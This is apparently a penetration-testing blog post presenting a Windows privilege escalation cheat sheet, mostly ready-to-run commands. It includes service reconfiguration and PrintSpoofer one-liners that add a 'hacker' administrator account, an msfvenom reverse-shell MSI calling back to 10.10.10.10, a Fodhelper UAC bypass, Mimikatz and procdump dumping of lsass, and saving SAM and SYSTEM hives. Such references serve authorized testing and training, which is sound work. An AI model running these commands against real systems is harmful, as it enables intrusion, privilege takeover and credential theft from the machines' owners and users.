---
layout: post
title: Windows Privilege Escalation
date: 2025-04-10 16:35 +0300
categories: [Windows]
tags: [windows, privilege escalation, enumeration]
---

## Introduction

This cheatsheet provides a structured methodology for identifying and exploiting Windows privilege escalation vectors. It includes commands, explanations, and a checklist approach for methodical testing during penetration tests or security assessments.

## Initial System Enumeration

### System Information

```powershell
# Basic system information
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"

# Check Windows version and architecture
(Get-WmiObject -Class Win32_OperatingSystem).Caption
[Environment]::Is64BitOperatingSystem

# Check installed hotfixes
wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB"
Get-HotFix | Sort-Object -Property InstalledOn -Descending

# Check for always installed as elevated registry keys
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
```

### User Enumeration

```powershell
# Current user and privileges
whoami /all

# List local users
net user

# List local administrators
net localgroup Administrators

# Check specific user's details
net user username

# List domain groups (if domain-joined)
net group /domain

# Check logged on users
query user
```

### Network Information

```powershell
# Network interfaces and IP addresses
ipconfig /all

# Network connections
netstat -ano

# Routing table
route print

# ARP cache
arp -a

# Hosts file
type C:\Windows\System32\drivers\etc\hosts
```

### Firewall Settings

```powershell
# Check firewall state
netsh advfirewall show currentprofile

# Check firewall rules
netsh advfirewall firewall show rule name=all

# PowerShell version
Get-NetFirewallProfile | Format-Table Name, Enabled
Get-NetFirewallRule | Where-Object {$_.Enabled -eq 'True' -and $_.Direction -eq 'Inbound'} | Format-Table Name,Profile
```

## Service Misconfigurations

### Service Enumeration

```powershell
# List all services
wmic service get name,displayname,pathname,startmode

# Check for unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """

# PowerShell version
Get-WmiObject -Class Win32_Service | Where-Object {$_.StartMode -eq 'Auto' -and $_.PathName -notmatch '^"' -and $_.PathName -notmatch '^C:\\Windows'} | Select-Object Name, PathName, StartMode
```

### Service Permissions Checker

```powershell
# Check service permissions (using accesschk from Sysinternals)
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv "Everyone" * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula

# Check specific service
accesschk.exe -ucqv ServiceName /accepteula

# PowerShell version (requires RSAT tools)
Get-ServiceAcl -Name ServiceName | Select-Object -ExpandProperty Access
```

### Service Binary Permissions

```powershell
# Check service binary permissions
icacls "C:\path\to\service\executable.exe"

# Check if current user can modify the executable
accesschk.exe -qwvu "UserName" "C:\path\to\service\executable.exe"
```

### Modifying Service Configuration

```powershell
# Modify service binary path (if you have permissions)
sc config ServiceName binPath= "cmd.exe /c net user hacker Password123! /add && net localgroup Administrators hacker /add"

# Start/stop service
net start ServiceName
net stop ServiceName
```

## Registry Exploits

### AutoRuns

```powershell
# Check auto-run executables
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce

# PowerShell version
Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run'
```

### AlwaysInstallElevated

```powershell
# Check if AlwaysInstallElevated is enabled
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# If both return 0x1, create malicious MSI:
# Using msfvenom
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f msi -o malicious.msi

# Install the malicious MSI
msiexec /quiet /qn /i malicious.msi
```

### Registry Permissions

```powershell
# Check permissions on registry keys
# Using PowerShell
Get-Acl -Path "HKLM:\SYSTEM\CurrentControlSet\Services\ServiceName" | Format-List

# Check if specific registry key is modifiable
accesschk.exe -kvw "Users" "HKLM\SYSTEM\CurrentControlSet\Services\ServiceName" /accepteula
```

## Scheduled Tasks

### Task Enumeration

```powershell
# List scheduled tasks
schtasks /query /fo LIST /v

# PowerShell version (more detailed)
Get-ScheduledTask | Where-Object {$_.TaskPath -notlike "\Microsoft*"} | Format-List TaskName,TaskPath,Triggers,Actions

# Check specific task
schtasks /query /tn "TaskName" /fo list /v
```

### Task Permissions

```powershell
# Check task files
icacls "C:\path\to\task\executable.exe"

# Check if task file is writable
accesschk.exe -qwvu "Users" "C:\path\to\task\executable.exe"
```

## DLL Hijacking

### Identifying DLL Hijacking Opportunities

```powershell
# Check loaded DLLs for a process
tasklist /m

# Check DLL search order issues using Process Monitor from Sysinternals
# Look for "NAME NOT FOUND" results when an application searches for DLLs

# Check for writable directories in the PATH
for %p in ("%path:;=";"%") do @(dir /a-d "%~p" 2>nul | findstr /v /i "system32 syswow64" | findstr /i ".dll")
```

### DLL Hijacking Process

1. Identify application loading DLLs
2. Check if you can write to any directory in the search path
3. Create malicious DLL with same name as the missing DLL
4. Restart the application/service/system

## Unquoted Service Paths

### Identifying Unquoted Paths

```powershell
# Find services with unquoted paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """

# PowerShell version
Get-WmiObject -Class Win32_Service | Where-Object {$_.StartMode -eq 'Auto' -and $_.PathName -notmatch '^"' -and $_.PathName -match ' '} | Select-Object Name, PathName, StartMode
```

### Exploiting Unquoted Paths

Example for service with path: `C:\Program Files\My Program\service.exe`

1. Check write permissions:
```powershell
# Check if any of these directories are writable
icacls "C:\Program.exe"
icacls "C:\Program Files\My.exe" 
icacls "C:\Program Files\My Program\service.exe"
```

2. Create malicious executable in writable location
3. Restart the service:
```powershell
net stop ServiceName
net start ServiceName
```

## Token Manipulation

### Impersonation with Incognito (Metasploit)

```
# In Meterpreter session
load incognito
list_tokens -u
impersonate_token "DOMAIN\\User"

# Check new privileges
getuid
```

### Abusing SeImpersonatePrivilege

```powershell
# Check if you have SeImpersonatePrivilege
whoami /priv

# If available, use tools like:
# - JuicyPotato
# - RoguePotato
# - PrintSpoofer
```

Example with PrintSpoofer:
```cmd
PrintSpoofer.exe -i -c "cmd /c net user hacker Password123! /add && net localgroup Administrators hacker /add"
```

## Stored Credentials

### Windows Credential Manager

```powershell
# List saved credentials
cmdkey /list

# Use saved credentials to run command
runas /savecred /user:DOMAIN\UserName "cmd.exe /c whoami > C:\temp\whoami.txt"
```

### Searching for Configuration Files and Passwords

```powershell
# Search for files containing 'password'
findstr /si password *.txt *.ini *.config *.xml

# PowerShell version
Get-ChildItem -Path C:\ -Include *.txt,*.ini,*.config,*.xml -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern "password" | Out-File C:\temp\found_passwords.txt
```

### Unattended Installation Files

```powershell
# Check for unattended installation files
type C:\Windows\Panther\Unattend.xml
type C:\Windows\Panther\Unattended.xml
type C:\Windows\Panther\Unattend\Unattended.xml
type C:\Windows\System32\Sysprep\Unattend.xml
type C:\Windows\System32\Sysprep\Panther\Unattend.xml
```

## File System Vulnerabilities

### Weak Folder/File Permissions

```powershell
# Check permissions on Program Files
icacls "C:\Program Files\*" | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users"
icacls "C:\Program Files (x86)\*" | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users"

# Check system32 directory permissions
icacls "C:\Windows\system32\*" | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users"

# PowerShell version
Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | Where-Object {$_.AccessToString -match "Everyone|BUILTIN\\Users.*(FullControl|Modify|Write)"}
```

### Writable Directories in PATH

```powershell
# List directories in PATH
echo %PATH%

# Check permissions on each directory in PATH
for %p in ("%path:;=";"%") do @(icacls "%~p" 2>nul | findstr /i "(F) (M) (W)")
```

## UAC Bypasses

### UAC Bypass Techniques

```powershell
# Check UAC level
REG QUERY HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
REG QUERY HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

# Various UAC bypass tools:
# - UACME (https://github.com/hfiref0x/UACME)
# - Fodhelper bypass
# - Event Viewer bypass
```

Example Fodhelper bypass:
```powershell
New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value "cmd.exe" -Force
New-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Name DelegateExecute -PropertyType String -Force
Start-Process C:\Windows\System32\fodhelper.exe
```

## Kernel Exploits

### Finding Vulnerable Kernels

```powershell
# Check Windows version and patches
systeminfo

# Check for kernel exploits with automation
# Use tools like Windows-Exploit-Suggester:
systeminfo > systeminfo.txt
windows-exploit-suggester.py --database 2021-04-10-mssb.xls --systeminfo systeminfo.txt
```

Common Windows kernel exploits:
- MS16-032
- MS15-051
- CVE-2019-1388
- CVE-2020-0787
- CVE-2020-1472 (Zerologon)

## Credential Dumping

### Memory Dumping

```powershell
# Mimikatz (PowerShell version)
Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"'

# Dump lsass.exe with Task Manager:
# 1. Open Task Manager
# 2. Find lsass.exe
# 3. Right-click > Create dump file

# Dump with procdump from Sysinternals
procdump.exe -ma lsass.exe lsass.dmp
```

### SAM and SYSTEM Backup

```powershell
# Copy SAM, SYSTEM, SECURITY registry hives
reg save HKLM\SAM sam.hive
reg save HKLM\SYSTEM system.hive
reg save HKLM\SECURITY security.hive

# Look for backup copies
dir C:\Windows\Repair\*.SAM
dir C:\Windows\System32\config\RegBack\*.SAM
```

### Finding Credentials in LSASS Dumps

```powershell
# Using Mimikatz
mimikatz.exe
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords full
```

## Quick Checklist

### System Information
- [ ] OS Version and architecture (systeminfo)
- [ ] Installed hotfixes (wmic qfe get)
- [ ] Environment variables (set)
- [ ] Current user privileges (whoami /all)

### Services & Applications
- [ ] Running processes (tasklist /svc)
- [ ] Service permissions (accesschk.exe -uwcqv "Authenticated Users" *)
- [ ] Unquoted service paths (wmic service get name,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """")
- [ ] Service binary permissions (icacls "C:\path\to\service\executable.exe")
- [ ] Installed applications (wmic product get name,version)

### Registry 
- [ ] AlwaysInstallElevated (reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated)
- [ ] AutoRun executables (reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run)
- [ ] Modifiable registry keys for services

### File System
- [ ] Scheduled tasks and permissions (schtasks /query /fo LIST /v)
- [ ] Writable directories in PATH
- [ ] Unattended installation files
- [ ] Configuration files containing credentials
- [ ] Weak NTFS permissions on program folders

### Credential Hunting
- [ ] Credential Manager (cmdkey /list)
- [ ] Search for password strings (findstr /si password *.txt *.ini *.config)
- [ ] Memory dumps (lsass.exe)
- [ ] SAM and SYSTEM hives

### Network
- [ ] Internal network connections (netstat -ano)
- [ ] Available routes to other systems (route print)
- [ ] Firewall configuration (netsh advfirewall show state)

### Exploits
- [ ] Kernel exploits based on missing patches
- [ ] UAC bypass potential
- [ ] DLL hijacking opportunities
- [ ] Token impersonation if SeImpersonatePrivilege available

## Common Exploits With Explanation

| Technique | Description | Detection | Exploitation |
|-----------|-------------|-----------|--------------|
| Unquoted Service Path | Windows searches for executable in each space in an unquoted path | `wmic service get name,pathname,startmode` | Place malicious executable in path |
| Weak Service Permissions | Service can be reconfigured by non-privileged user | `accesschk.exe -uwcqv "Authenticated Users" *` | Modify service binary path |
| Weak File Permissions | Executable run by privileged user is writable | `icacls "C:\Program Files\Vulnerable App\*.exe"` | Replace with malicious executable |
| AlwaysInstallElevated | MSI installers run with SYSTEM privileges | Check registry keys | Create malicious MSI installer |
| DLL Hijacking | Application loads DLLs from insecure location | Process Monitor for "NAME NOT FOUND" DLLs | Place malicious DLL in search path |
| Kernel Exploits | Missing Windows security patches | `systeminfo` + Windows Exploit Suggester | Execute appropriate exploit |
| Token Impersonation | SeImpersonatePrivilege allows identity theft | `whoami /priv` | Use JuicyPotato, RoguePotato, PrintSpoofer |
| UAC Bypass | Circumvent User Account Control | Check UAC settings in registry | Execute appropriate bypass technique |

## Windows Privilege Escalation Tools

- **PowerUp**: PowerShell script for privilege escalation checks
- **BeRoot**: Windows privilege escalation scanner
- **JAWS**: PowerShell script for enumeration
- **Sherlock/Watson**: Find missing patches
- **Seatbelt**: Security-focused system survey script
- **SharpUp**: C# port of PowerUp
- **WinPEAS**: Windows local Privilege Escalation Awesome Script

## Command Line Cheat Sheet

```cmd
REM Current username
whoami

REM Current privileges
whoami /priv

REM User and group information
whoami /all

REM List users
net user

REM List specific user
net user username

REM List groups
net localgroup

REM List administrators
net localgroup Administrators

REM Network interfaces
ipconfig /all

REM Network routing tables
route print

REM Active network connections
netstat -ano

REM Firewall state
netsh advfirewall show currentprofile

REM Scheduled tasks
schtasks /query /fo LIST /v

REM Running services
tasklist /SVC

REM Service information
sc qc ServiceName

REM Service configuration
sc query ServiceName

REM View startup services
wmic startup list full

REM Account password policy
net accounts
```

## References

1. [PayloadsAllTheThings - Windows Privilege Escalation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
2. [Absolomb's Windows Privilege Escalation Guide](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
3. [Fuzzy Security's Windows Privilege Escalation Guide](https://www.fuzzysecurity.com/tutorials/16.html)
4. [Sushant 747's Windows Privilege Escalation Guide](https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html)
5. [Priv2Admin - Domain Account to Local Admin](https://github.com/gtworek/Priv2Admin)



